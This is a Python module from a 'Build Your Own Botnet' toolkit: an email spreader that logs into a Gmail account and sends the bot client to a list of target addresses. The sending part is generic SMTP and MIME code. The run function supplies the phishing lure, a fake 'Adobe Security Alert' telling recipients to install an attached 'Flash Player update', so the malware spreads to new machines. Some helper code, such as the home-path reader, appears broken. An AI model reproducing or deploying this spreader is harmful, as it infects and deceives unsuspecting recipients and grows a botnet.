#!/usr/bin/python
# -*- coding: utf-8 -*-
'Email Spreader (Build Your Own Botnet)'

# standard library
import os
import re
import time
import email
import logging
import smtplib
import mimetypes

try:
    string_types = (str, unicode)
except NameError:
    string_types = (str, )

# globals
command = True
platforms = ['win32','darwin','linux2']
GOOGLE_ACCOUNTS_BASE_URL = 'https://accounts.google.com'
REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob'
description = """
Client emails a copy of itself to a list of target addresses with the subject 'Adobe Security Alert',
urging the user to install a 'Flash Player update', thereby spreading the client to new systems
"""

# regex
WSP = r'[ \t]'
CRLF = r'(?:\r\n)'
NO_WS_CTL = r'\x01-\x08\x0b\x0c\x0f-\x1f\x7f'
QUOTED_PAIR = r'(?:\\.)'
FWS = r'(?:(?:' + WSP + r'*' + CRLF + r')?' + WSP + r'+)'
CTEXT = r'[' + NO_WS_CTL + r'\x21-\x27\x2a-\x5b\x5d-\x7e]'
CCONTENT = r'(?:' + CTEXT + r'|' + QUOTED_PAIR + r')'
COMMENT = r'\((?:' + FWS + r'?' + CCONTENT + r')*' + FWS + r'?\)'
CFWS = r'(?:' + FWS + r'?' + COMMENT + ')*(?:' + FWS + '?' + COMMENT + '|' + FWS + ')'
ATEXT = r'[\w!#$%&\'\*\+\-/=\?\^`\{\|\}~]'
ATOM = CFWS + r'?' + ATEXT + r'+' + CFWS + r'?'
DOT_ATOM_TEXT = ATEXT + r'+(?:\.' + ATEXT + r'+)*'
DOT_ATOM = CFWS + r'?' + DOT_ATOM_TEXT + CFWS + r'?'
QTEXT = r'[' + NO_WS_CTL + r'\x21\x23-\x5b\x5d-\x7e]'
QCONTENT = r'(?:' + QTEXT + r'|' + QUOTED_PAIR + r')'
QUOTED_STRING = CFWS + r'?' + r'"(?:' + FWS + r'?' + QCONTENT + r')*' + FWS + r'?' + r'"' + CFWS + r'?'
LOCAL_PART = r'(?:' + DOT_ATOM + r'|' + QUOTED_STRING + r')'
DTEXT = r'[' + NO_WS_CTL + r'\x21-\x5a\x5e-\x7e]'
DCONTENT = r'(?:' + DTEXT + r'|' + QUOTED_PAIR + r')'
DOMAIN_LITERAL = CFWS + r'?' + r'\[' + r'(?:' + FWS + r'?' + DCONTENT + r')*' + FWS + r'?\]' + CFWS + r'?'
DOMAIN = r'(?:' + DOT_ATOM + r'|' + DOMAIN_LITERAL + r')'
ADDR_SPEC = LOCAL_PART + r'@' + DOMAIN
VALID_ADDRESS_REGEXP = '^' + ADDR_SPEC + '$'

# errors
class AddressError(Exception):
    """
    Address was given in an invalid format.

    `from` can either be a string, or a dictionary where the key is an email,
    and the value is an alias.

    `to` can be a string (email), a list of emails (email addresses without aliases)
    or a dictionary where keys are the email addresses and the values indicate the aliases.
    """
    pass

class InvalidEmailAddress(Exception):
    """
    Invalid email address syntax
    """
    pass

# utilities
class raw(str):
    """
    Ensure that a string is treated as text and will not receive 'magic'
    """
    pass

class inline(str):
    """
    Only needed when wanting to inline an image rather than attach it
    """
    pass

def find_user_home_path():
    with open(os.path.expanduser("~")) as f:
        return f.read().strip()

def validate_email_with_regex(email_address):
    """
    Note that this will only filter out syntax mistakes in emailaddresses.
    If a human would think it is probably a valid email, it will most likely pass.
    However, it could still very well be that the actual emailaddress has simply
    not be claimed by anyone (so then this function fails to devalidate).
    """
    if not re.match(VALID_ADDRESS_REGEXP, email_address):
        emsg = 'Emailaddress "{}" is not valid according to RFC 2822 standards'.format(
            email_address)
        raise InvalidEmailAddress(emsg)
    if "." not in email_address and "localhost" not in email_address.lower():
        raise InvalidEmailAddress("Missing dot in email address")

def get_logger(log_level=logging.DEBUG, file_path_name=None):
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.ERROR)
    if file_path_name:
        ch = logging.FileHandler(file_path_name)
    elif log_level is None:
        logger.handlers = [logging.NullHandler()]
        return logger
    else:
        ch = logging.StreamHandler()
    ch.setLevel(log_level)
    formatter = logging.Formatter("%(asctime)s [spreader] [%(levelname)s] : %(message)s", "%Y-%m-%d %H:%M:%S")
    ch.setFormatter(formatter)
    logger.handlers = [ch]
    return logger

# headers
def resolve_addresses(user, useralias, to, cc, bcc):
    addresses = {"recipients": []}
    if to is not None:
        make_addr_alias_target(to, addresses, "To")
    elif cc is not None and bcc is not None:
        make_addr_alias_target([user, useralias], addresses, "To")
    else:
        addresses["recipients"].append(user)
    if cc is not None:
        make_addr_alias_target(cc, addresses, "Cc")
    if bcc is not None:
        make_addr_alias_target(bcc, addresses, "Bcc")
    return addresses

def make_addr_alias_user(email_addr):
    if isinstance(email_addr, string_types):
        if "@" not in email_addr:
            email_addr += "@gmail.com"
        return (email_addr, email_addr)
    if isinstance(email_addr, dict):
        if len(email_addr) == 1:
            return (list(email_addr.keys())[0], list(email_addr.values())[0])
    raise AddressError

def make_addr_alias_target(x, addresses, which):
    if isinstance(x, string_types):
        addresses["recipients"].append(x)
        addresses[which] = x
    elif isinstance(x, list) or isinstance(x, tuple):
        if not all([isinstance(k, string_types) for k in x]):
            raise AddressError
        addresses["recipients"].extend(x)
        addresses[which] = "; ".join(x)
    elif isinstance(x, dict):
        addresses["recipients"].extend(x.keys())
        addresses[which] = "; ".join(x.values())
    else:
        raise AddressError

def add_subject(msg, subject):
    if not subject:
        return
    if isinstance(subject, list):
        subject = " ".join(subject)
    msg["Subject"] = subject

def add_recipients_headers(user, useralias, msg, addresses):
    msg["From"] = '"{0}" <{1}>'.format(useralias.replace("\\", "\\\\").replace('"', '\\"'), user)
    if "To" in addresses:
        msg["To"] = addresses["To"]
    else:
        msg["To"] = useralias
    if "Cc" in addresses:
        msg["Cc"] = addresses["Cc"]

# message
def prepare_message(user, useralias, addresses, subject, contents, attachments, headers, encoding):
    if isinstance(contents, string_types):
        contents = [contents]
    if isinstance(attachments, string_types):
        attachments = [attachments]

    if attachments is not None:
        for a in attachments:
            if not os.path.isfile(a):
                raise TypeError("'{0}' is not a valid filepath".format(a))
        contents = attachments if contents is None else contents + attachments

    has_included_images, content_objects = prepare_contents(contents, encoding)
    msg = email.MIMEMultipart.MIMEMultipart()
    if headers is not None:
        for k, v in headers.items():
            msg[k] = v
    if headers is None or "Date" not in headers:
        msg["Date"] = email.utils.formatdate()

    msg_alternative = email.MIMEMultipart.MIMEMultipart("alternative")
    msg_related = email.MIMEMultipart.MIMEMultipart("related")
    msg_related.attach("-- HTML goes here --")
    msg.attach(msg_alternative)
    add_subject(msg, subject)
    add_recipients_headers(user, useralias, msg, addresses)
    htmlstr = ""
    altstr = []
    if has_included_images:
        msg.preamble = "This message is best displayed using a MIME capable email reader."

    if contents is not None:
        for content_object, content_string in zip(content_objects, contents):
            if content_object["main_type"] == "image":
                email.encoders.encode_base64(content_object["mime_object"])
                if isinstance(content_string, dict) and len(content_string) == 1:
                    for key in content_string:
                        hashed_ref = str(abs(hash(key)))
                        alias = content_string[key]
                    content_string = key
                else:
                    alias = os.path.basename(str(content_string))
                    hashed_ref = str(abs(hash(alias)))

                if type(content_string) == inline:
                    htmlstr += '<img src="cid:{0}" title="{1}"/>'.format(hashed_ref, alias)
                    content_object["mime_object"].add_header(
                        "Content-ID", "<{0}>".format(hashed_ref)
                    )
                    altstr.append("-- img {0} should be here -- ".format(alias))
                    msg_related.attach(content_object["mime_object"])
                else:
                    msg.attach(content_object["mime_object"])

            else:
                if content_object["encoding"] == "base64":
                    email.encoders.encode_base64(content_object["mime_object"])
                    msg.attach(content_object["mime_object"])
                elif content_object["sub_type"] not in ["html", "plain"]:
                    msg.attach(content_object["mime_object"])
                else:
                    content_string = content_string.replace("\n", "<br>")
                    try:
                        htmlstr += "<div>{0}</div>".format(content_string)
                    except UnicodeEncodeError:
                        htmlstr += u"<div>{0}</div>".format(content_string)
                    altstr.append(content_string)

    msg_related.get_payload()[0] = email.MIMEText.MIMEText(htmlstr, "html", _charset=encoding)
    msg_alternative.attach(email.MIMEText.MIMEText("\n".join(altstr), _charset=encoding))
    msg_alternative.attach(msg_related)
    return msg

def prepare_contents(contents, encoding):
    mime_objects = []
    has_included_images = False
    if contents is not None:
        for content in contents:
            content_object = get_mime_object(content, encoding)
            if content_object["main_type"] == "image":
                has_included_images = True
            mime_objects.append(content_object)
    return has_included_images, mime_objects

def get_mime_object(content_string, encoding):
    content_object = {"mime_object": None, "encoding": None, "main_type": None, "sub_type": None}

    if isinstance(content_string, dict):
        for x in content_string:
            content_string, content_name = x, content_string[x]
    else:
        try:
            content_name = os.path.basename(str(content_string))
        except UnicodeEncodeError:
            content_name = os.path.basename(content_string)
    is_raw = type(content_string) == raw
    if not is_raw and os.path.isfile(content_string):
        with open(content_string, "rb") as f:
            content_object["encoding"] = "base64"
            content = f.read()
    else:
        content_object["main_type"] = "text"

        if is_raw:
            content_object["mime_object"] = email.MIMEText.MIMEText(content_string, _charset=encoding)
        else:
            content_object["mime_object"] = email.MIMEText.MIMEText(content_string, "html", _charset=encoding)
            content_object["sub_type"] = "html"

        if content_object["sub_type"] is None:
            content_object["sub_type"] = "plain"
        return content_object

    if content_object["main_type"] is None:
        content_type, _ = mimetypes.guess_type(content_string)

        if content_type is not None:
            content_object["main_type"], content_object["sub_type"] = content_type.split("/")

    if content_object["main_type"] is None or content_object["encoding"] is not None:
        if content_object["encoding"] != "base64":
            content_object["main_type"] = "application"
            content_object["sub_type"] = "octet-stream"

    mime_object = email.MIMEBase.MIMEBase(
        content_object["main_type"], content_object["sub_type"], name=content_name
    )
    mime_object.set_payload(content)
    content_object["mime_object"] = mime_object
    return content_object

class SMTPBase:
    """
    Wrapper around smtplib.SMTP connection, and allows messages to be sent
    """

    def __init__(
        self,
        user=None,
        password=None,
        host="smtp.gmail.com",
        port=None,
        smtp_starttls=None,
        smtp_ssl=True,
        smtp_set_debuglevel=0,
        smtp_skip_login=False,
        encoding="utf-8",
        soft_email_validation=True,
        **kwargs
    ):
        self.log = get_logger()
        self.set_logging()
        self.soft_email_validation = soft_email_validation
        self.user, self.useralias = make_addr_alias_user(user)
        if soft_email_validation:
            validate_email_with_regex(self.user)
        self.is_closed = None
        self.host = host
        self.port = str(port) if port is not None else "465" if smtp_ssl else "587"
        self.smtp_starttls = smtp_starttls
        self.ssl = smtp_ssl
        self.smtp_skip_login = smtp_skip_login
        self.debuglevel = smtp_set_debuglevel
        self.encoding = encoding
        self.kwargs = kwargs
        self.cache = {}
        self.unsent = []
        self.num_mail_sent = 0
        self.credentials = password

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if not self.is_closed:
            self.close()
        return False

    @property
    def connection(self):
        return smtplib.SMTP_SSL if self.ssl else smtplib.SMTP

    @property
    def starttls(self):
        if self.smtp_starttls is None:
            return False if self.ssl else True
        return self.smtp_starttls

    def set_logging(self, log_level=logging.ERROR, file_path_name=None):
        self.log = get_logger(log_level, file_path_name)

    def prepare_send(
        self,
        to=None,
        subject=None,
        contents=None,
        attachments=None,
        cc=None,
        bcc=None,
        headers=None,
    ):
        addresses = resolve_addresses(self.user, self.useralias, to, cc, bcc)

        if self.soft_email_validation:
            for email_addr in addresses["recipients"]:
                validate_email_with_regex(email_addr)

        msg = prepare_message(
            self.user,
            self.useralias,
            addresses,
            subject,
            contents,
            attachments,
            headers,
            self.encoding,
        )

        recipients = addresses["recipients"]
        msg_string = msg.as_string()
        return recipients, msg_string

    def send(
        self,
        to=None,
        subject=None,
        contents=None,
        attachments=None,
        cc=None,
        bcc=None,
        preview_only=False,
        headers=None,
    ):
        """
        Send an email with Gmail
        """
        self.login()
        recipients, msg_string = self.prepare_send(
            to, subject, contents, attachments, cc, bcc, headers
        )
        if preview_only:
            return (recipients, msg_string)
        return self._attempt_send(recipients, msg_string)

    def _attempt_send(self, recipients, msg_string):
        attempts = 0
        while attempts < 3:
            try:
                result = self.smtp.sendmail(self.user, recipients, msg_string)
                self.log.info("Message sent to %s", recipients)
                self.num_mail_sent += 1
                return result
            except smtplib.SMTPServerDisconnected as e:
                self.log.error(e)
                attempts += 1
                time.sleep(attempts * 3)
        self.unsent.append((recipients, msg_string))
        return False

    def send_unsent(self):
        """
        Emails that were not being able to send will be stored in :attr:`self.unsent`.
        Use this function to attempt to send these again
        """
        for i in range(len(self.unsent)):
            recipients, msg_string = self.unsent.pop(i)
            self._attempt_send(recipients, msg_string)

    def close(self):
        """
        Close the connection to the SMTP server
        """
        self.is_closed = True
        try:
            self.smtp.quit()
        except (TypeError, AttributeError, smtplib.SMTPServerDisconnected):
            pass

    def _login(self, password):
        """
        Login to the SMTP server using password

        """
        self.smtp = self.connection(self.host, self.port, **self.kwargs)
        self.smtp.set_debuglevel(self.debuglevel)
        if self.starttls:
            self.smtp.ehlo()
            if self.starttls is True:
                self.smtp.starttls()
            else:
                self.smtp.starttls(**self.starttls)
            self.smtp.ehlo()
        self.is_closed = False
        if not self.smtp_skip_login:
            self.smtp.login(self.user, password)
        self.log.info("Connected to SMTP @ %s:%s as %s", self.host, self.port, self.user)

    def __del__(self):
        try:
            if not self.is_closed:
                self.close()
        except AttributeError:
            pass


class SMTP(SMTPBase):
    def login(self):
        self._login(self.credentials)

# main
def run(gmail, password, attachment, recipients):
    """
    Run email spreader

    `Required`
    :param str gmail:       sender Gmail address
    :param str password:    sender Gmail password
    :param str attachment:  client filename
    :param list recipients: list of recipient email addresses

    """
    s = SMTP(gmail, password)
    s.send(to=recipients, subject='Adobe Security Alert: Flash Player Update', contents='A critical vulnerability has just been patched in the lastest version of Adobe Flash Player. Please install the attached update to secure your personal information.', attachments=attachment)
    return "Email spreader running"
